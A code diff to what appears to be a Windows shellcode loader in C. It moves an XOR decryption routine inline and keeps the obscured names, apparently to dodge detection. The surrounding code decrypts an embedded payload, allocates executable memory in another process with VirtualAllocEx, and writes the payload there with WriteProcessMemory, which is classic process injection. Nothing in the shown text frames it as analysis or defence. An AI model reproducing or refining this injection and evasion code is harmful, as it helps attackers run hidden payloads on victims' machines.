@@ -16,17 +16,6 @@ void loadkumres(const char* rssssame, char** data, DWORD* size) {
 
 
 
-
-
-
-
-void daggerman101(char* coddmanku1, DWORD lenofcod1, unsigned char* ke44y5, DWORD k2e3y1en) {
-    for (DWORD ma1su = 0; ma1su < lenofcod1; ma1su++) {
-        coddmanku1[ma1su] ^= ke44y5[ma1su % k2e3y1en]; 
-    }
-}
-
-
 int main() {
     Sleep(2000);
     
@@ -52,7 +41,9 @@ int main() {
               
               LPVOID clamonua = VirtualAllocEx(hProcess, NULL, kkcodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
               //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
-              daggerman101(kkcode, kkcodeLen, kkeyakesey , kkeyakeseyLen);
+              for (DWORD ma1su = 0; ma1su < kkcodeLen; ma1su++) {
+                 kkcode[ma1su] ^= kkeyakesey[ma1su % kkeyakeseyLen]; 
+             }
              
               WriteProcessMemory(hProcess, clamonua, kkcode, kkcodeLen, NULL);
              
